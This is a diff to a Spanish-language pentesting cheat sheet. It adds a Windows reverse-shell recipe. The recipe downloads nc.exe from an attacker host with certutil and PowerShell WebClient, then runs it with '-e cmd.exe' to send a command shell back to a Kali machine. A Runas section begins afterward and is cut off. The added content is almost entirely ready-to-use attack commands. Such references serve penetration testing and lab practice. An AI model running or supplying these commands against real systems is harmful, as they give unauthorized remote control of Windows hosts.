@@ -103,8 +103,17 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 
 ## 3. REVERSE SHELLS — WINDOWS (POWERSHELL)
 
-### Runas
+### Clásica - Subiendo Netcat a Temp
+```bash 
+# Subir Netcat 
+❯ certutil -urlcache -f http://<IP>/nc.exe C:\Windows\Temp\nc.exe
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','C:\Windows\Temp\nc.exe')"
 
+# Ejecutar la Revershell 
+❯ C:\Windows\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
+```
+
+### Runas
 ```bash 
 # Ejecutar la revershell
 # Se debe tener la password del usuario 'Administrator'
